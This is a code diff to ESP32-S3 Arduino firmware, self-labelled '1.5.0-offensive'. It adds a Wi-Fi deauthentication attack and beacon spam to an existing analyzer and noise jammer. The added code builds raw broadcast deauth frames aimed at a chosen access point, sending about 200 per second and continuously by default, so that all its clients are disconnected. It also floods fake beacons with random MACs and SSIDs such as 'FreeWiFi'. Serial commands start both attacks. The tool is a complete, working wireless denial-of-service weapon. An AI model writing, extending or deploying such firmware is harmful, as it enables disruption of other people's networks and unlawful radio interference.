@@ -1,11 +1,12 @@
 /**
- * ESP32-S3 Wi-Fi Analyzer + Dual Mode Noise Jammer
- * Version: 1.4.0 - Wideband + Single Channel
+ * ESP32-S3 Wi-Fi Analyzer + Dual Mode Noise Jammer + Deauth/Beacon Attack
+ * Version: 1.5.0 - Wideband + Single Channel + Deauth + Beacon Spam
  */
 
 #include <Arduino.h>
 #include <WiFi.h>
 #include <esp_wifi.h>
+#include <string.h>
 
 #define SERIAL_BAUD       115200
 #define DEFAULT_INTERVAL  5000
@@ -24,12 +25,44 @@ uint32_t lastSerialCheck = 0;
 uint32_t lastHopTime    = 0;
 uint8_t  currentChannel = 1;
 
+// Deauth State
+bool    deauthMode      = false;
+uint8_t deauthBSSID[6]  = {0};
+uint8_t deauthChannel   = 1;
+int     deauthCount     = 0;   // 0 = continuous
+int     deauthSent      = 0;
+uint32_t lastDeauthTime = 0;
+
+// Beacon Spam State
+bool    beaconMode      = false;
+String  beaconSSIDPrefix = "FreeWiFi";
+uint8_t beaconCount     = 10;
+uint8_t beaconChannel   = 6;
+uint8_t beaconIndex     = 0;
+uint32_t lastBeaconTime = 0;
+
+// ================================================================
+//                     HELPERS
+// ================================================================
+
+bool parseBSSID(const String& str, uint8_t* out) {
+  // Accepts "AA:BB:CC:DD:EE:FF"
+  if (str.length() < 17) return false;
+  for (int i = 0; i < 6; i++) {
+    String b = str.substring(i * 3, i * 3 + 2);
+    out[i] = (uint8_t)strtol(b.c_str(), nullptr, 16);
+  }
+  return true;
+}
+
 // ================================================================
 //                     NOISE FUNCTIONS
 // ================================================================
 
 void startNoise(bool wideband, uint8_t ch = 6) {
   if (noiseMode) return;
+  if (deauthMode) stopDeauth();
+  if (beaconMode) stopBeaconSpam();
   
   isWideband = wideband;
   noiseChannel = constrain(ch, 1, 13);
@@ -73,6 +106,136 @@ void transmitBurst() {
   }
 
   esp_wifi_80211_tx(WIFI_IF_AP, packet, 64, false);
+}
+
+// ================================================================
+//                     DEAUTH FUNCTIONS
+// ================================================================
+
+void startDeauth(const String& bssid, uint8_t ch, int count) {
+  if (!parseBSSID(bssid, deauthBSSID)) {
+    Serial.println("{\"type\":\"error\",\"msg\":\"invalid_bssid\"}");
+    return;
+  }
+  deauthChannel = constrain(ch, 1, 13);
+  deauthCount   = count;
+  deauthSent    = 0;
+  deauthMode    = true;
+
+  WiFi.mode(WIFI_AP);
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
+  esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);
+
+  Serial.printf("{\"type\":\"status\",\"status\":\"deauth_on\",\"bssid\":\"%s\",\"channel\":%d,\"count\":%d}\n",
+                bssid.c_str(), deauthChannel, count);
+}
+
+void stopDeauth() {
+  if (!deauthMode) return;
+  deauthMode = false;
+  WiFi.mode(WIFI_STA);
+  esp_wifi_set_mode(WIFI_MODE_STA);
+  Serial.printf("{\"type\":\"status\",\"status\":\"deauth_off\",\"sent\":%d}\n", deauthSent);
+}
+
+void sendDeauthFrame() {
+  // 802.11 deauthentication frame (broadcast — kicks all clients from AP)
+  uint8_t frame[26] = {
+    0xC0, 0x00,                         // Frame Control: Management / Deauth
+    0x00, 0x00,                         // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA: broadcast
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA: BSSID (filled below)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (filled below)
+    0x00, 0x00,                         // Sequence Control
+    0x07, 0x00                          // Reason: Class 3 frame from nonassoc STA
+  };
+  memcpy(&frame[10], deauthBSSID, 6);
+  memcpy(&frame[16], deauthBSSID, 6);
+
+  esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+  deauthSent++;
+}
+
+// ================================================================
+//                     BEACON SPAM FUNCTIONS
+// ================================================================
+
+void startBeaconSpam(const String& prefix, uint8_t count, uint8_t ch) {
+  beaconSSIDPrefix = prefix;
+  beaconCount      = count < 1 ? 1 : (count > 50 ? 50 : count);
+  beaconChannel    = constrain(ch, 1, 13);
+  beaconIndex      = 0;
+  beaconMode       = true;
+
+  WiFi.mode(WIFI_AP);
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
+  esp_wifi_set_channel(beaconChannel, WIFI_SECOND_CHAN_NONE);
+
+  Serial.printf("{\"type\":\"status\",\"status\":\"beacon_on\",\"prefix\":\"%s\",\"count\":%d,\"channel\":%d}\n",
+                prefix.c_str(), beaconCount, beaconChannel);
+}
+
+void stopBeaconSpam() {
+  if (!beaconMode) return;
+  beaconMode = false;
+  WiFi.mode(WIFI_STA);
+  esp_wifi_set_mode(WIFI_MODE_STA);
+  Serial.println("{\"type\":\"status\",\"status\":\"beacon_off\"}");
+}
+
+void sendBeaconFrame() {
+  // Build SSID: prefix + index number
+  String ssid = beaconSSIDPrefix;
+  ssid += String(beaconIndex);
+  uint8_t ssidLen = ssid.length() > 32 ? 32 : (uint8_t)ssid.length();
+
+  // Random source MAC / BSSID for this beacon
+  uint8_t mac[6];
+  uint32_t r1 = esp_random(), r2 = esp_random();
+  memcpy(mac, &r1, 4);
+  memcpy(mac + 4, &r2, 2);
+  mac[0] = (mac[0] & 0xFE) | 0x02; // Locally administered, unicast
+
+  uint8_t frame[128];
+  uint8_t pos = 0;
+
+  // Frame Control: Beacon (0x80, 0x00)
+  frame[pos++] = 0x80; frame[pos++] = 0x00;
+  // Duration
+  frame[pos++] = 0x00; frame[pos++] = 0x00;
+  // DA: broadcast
+  frame[pos++] = 0xFF; frame[pos++] = 0xFF; frame[pos++] = 0xFF;
+  frame[pos++] = 0xFF; frame[pos++] = 0xFF; frame[pos++] = 0xFF;
+  // SA
+  memcpy(&frame[pos], mac, 6); pos += 6;
+  // BSSID
+  memcpy(&frame[pos], mac, 6); pos += 6;
+  // Sequence Control
+  frame[pos++] = 0x00; frame[pos++] = 0x00;
+  // Timestamp (8 bytes)
+  uint64_t ts = (uint64_t)micros();
+  memcpy(&frame[pos], &ts, 8); pos += 8;
+  // Beacon Interval: 100 TU
+  frame[pos++] = 0x64; frame[pos++] = 0x00;
+  // Capability: ESS, short preamble
+  frame[pos++] = 0x21; frame[pos++] = 0x04;
+  // SSID element
+  frame[pos++] = 0x00;
+  frame[pos++] = ssidLen;
+  memcpy(&frame[pos], ssid.c_str(), ssidLen); pos += ssidLen;
+  // Supported Rates element
+  frame[pos++] = 0x01; frame[pos++] = 0x08;
+  frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8B; frame[pos++] = 0x96;
+  frame[pos++] = 0x24; frame[pos++] = 0x30; frame[pos++] = 0x48; frame[pos++] = 0x6C;
+  // DS Parameter Set (channel)
+  frame[pos++] = 0x03; frame[pos++] = 0x01; frame[pos++] = beaconChannel;
+
+  esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);
+
+  beaconIndex = (beaconIndex + 1) % beaconCount;
 }
 
 // ================================================================
@@ -172,8 +335,56 @@ void handleCommand(String cmd) {
     int val = c.substring(9).toInt();
     if (val >= 1 && val <= 300) scanInterval = (uint32_t)val * 1000;
   }
+  else if (c.startsWith("DEAUTH_START ")) {
+    // DEAUTH_START <bssid> <channel> [count]
+    String args = cmd.substring(13);
+    args.trim();
+    int sp1 = args.indexOf(' ');
+    if (sp1 < 0) { Serial.println("{\"type\":\"error\",\"msg\":\"usage: DEAUTH_START <bssid> <ch> [count]\"}"); return; }
+    String bssid = args.substring(0, sp1);
+    String rest = args.substring(sp1 + 1);
+    rest.trim();
+    int sp2 = rest.indexOf(' ');
+    uint8_t ch = 1;
+    int count = 0;
+    if (sp2 < 0) {
+      ch = (uint8_t)rest.toInt();
+    } else {
+      ch    = (uint8_t)rest.substring(0, sp2).toInt();
+      count = rest.substring(sp2 + 1).toInt();
+    }
+    startDeauth(bssid, ch, count);
+  }
+  else if (c == "DEAUTH_STOP") stopDeauth();
+  else if (c.startsWith("BEACON_START")) {
+    // BEACON_START [prefix] [count] [channel]
+    String args = cmd.substring(12);
+    args.trim();
+    String prefix = beaconSSIDPrefix;
+    uint8_t count = beaconCount;
+    uint8_t ch    = beaconChannel;
+    if (args.length() > 0) {
+      int s1 = args.indexOf(' ');
+      if (s1 < 0) {
+        prefix = args;
+      } else {
+        prefix = args.substring(0, s1);
+        String rest = args.substring(s1 + 1);
+        rest.trim();
+        int s2 = rest.indexOf(' ');
+        if (s2 < 0) {
+          count = (uint8_t)rest.toInt();
+        } else {
+          count = (uint8_t)rest.substring(0, s2).toInt();
+          ch    = (uint8_t)rest.substring(s2 + 1).toInt();
+        }
+      }
+    }
+    startBeaconSpam(prefix, count, ch);
+  }
+  else if (c == "BEACON_STOP") stopBeaconSpam();
   else if (c == "INFO") {
-    Serial.printf("{\"type\":\"info\",\"fw\":\"1.4.0-dual\",\"chip\":\"ESP32-S3\",\"heap\":%d}\n", ESP.getFreeHeap());
+    Serial.printf("{\"type\":\"info\",\"fw\":\"1.5.0-offensive\",\"chip\":\"ESP32-S3\",\"heap\":%d}\n", ESP.getFreeHeap());
   }
 }
 
@@ -186,7 +397,7 @@ void setup() {
   delay(800);
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
-  Serial.println("{\"type\":\"ready\",\"fw\":\"1.4.0-dual\",\"chip\":\"ESP32-S3\"}");
+  Serial.println("{\"type\":\"ready\",\"fw\":\"1.5.0-offensive\",\"chip\":\"ESP32-S3\"}");
 }
 
 void loop() {
@@ -205,6 +416,25 @@ void loop() {
     if (now - lastScan >= scanInterval) {
       lastScan = now;
       performScan();
+    }
+  }
+
+  if (deauthMode) {
+    uint32_t now = millis();
+    if (now - lastDeauthTime >= 5) {  // ~200 frames/sec
+      lastDeauthTime = now;
+      sendDeauthFrame();
+      if (deauthCount > 0 && deauthSent >= deauthCount) {
+        stopDeauth();
+      }
+    }
+  }
+
+  if (beaconMode) {
+    uint32_t now = millis();
+    if (now - lastBeaconTime >= 100) {  // 10 beacons/sec cycling through fake SSIDs
+      lastBeaconTime = now;
+      sendBeaconFrame();
     }
   }
 
